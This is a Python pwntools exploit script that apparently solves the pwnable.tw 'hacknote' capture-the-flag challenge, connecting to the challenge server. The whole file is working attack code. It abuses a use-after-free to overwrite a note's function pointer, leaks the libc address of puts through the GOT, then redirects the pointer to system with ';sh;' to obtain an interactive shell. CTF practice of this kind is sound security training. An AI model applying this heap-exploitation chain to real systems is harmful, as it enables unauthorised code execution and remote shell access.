#!/usr/bin/env python3

from pwn import *

e = ELF("hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e 
context.log_level='debug'

def conn():
    if args.LOCAL:
        r = process([e.path])
        #r = gdb.debug([e.path], 'c')
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote("addr", 1337)
        r = remote('chall.pwnable.tw', 10102)

    return r

def add(r, sz, content):
    r.recvuntil(b':')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(str(sz).encode())
    r.recvuntil(b':')
    r.send(content if len(content)>0 else b'\n')
def delete(r, i):
    r.recvuntil(b':')
    r.sendline(b'2')
    r.recvuntil(b':')
    r.sendline(str(i).encode())
def view(r, i):
    r.recvuntil(b':')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(i).encode())
def main():
    r = conn()

    # good luck pwning :)
    add(r, 0x20, b'a')
    add(r, 0x20, b'a')
    delete(r, 1)
    delete(r, 0)
    add(r, 0x8, p32(0x804862b) + p32(e.got['puts']))
    view(r, 1)
    puts_addr = u32(r.recv(4))    
    print('puts @', hex(puts_addr))
    libc.address = puts_addr - libc.sym['puts']
    print('libc @', hex(libc.address))
    delete(r, 2)
    add(r, 0x8, p32(libc.sym['system']) + b';sh;')
    input('continue')
    view(r, 1)
    r.interactive()


if __name__ == "__main__":
    main()
